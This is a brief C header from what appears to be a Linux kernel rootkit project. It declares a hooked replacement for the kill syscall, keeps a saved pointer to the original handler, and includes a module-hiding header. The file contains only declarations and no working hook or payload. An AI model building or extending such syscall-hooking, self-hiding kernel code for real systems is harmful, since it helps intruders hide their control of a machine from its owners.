#ifndef BSO_ROOTKIT_MY_SYSCALLS_H
#define BSO_ROOTKIT_MY_SYSCALLS_H

#include "utils.h"
#include "hide_module.h"

extern pt_regs_t orig_kill;


asmlinkage unsigned long my_kill(const struct pt_regs *regs);

#endif //BSO_ROOTKIT_MY_SYSCALLS_H
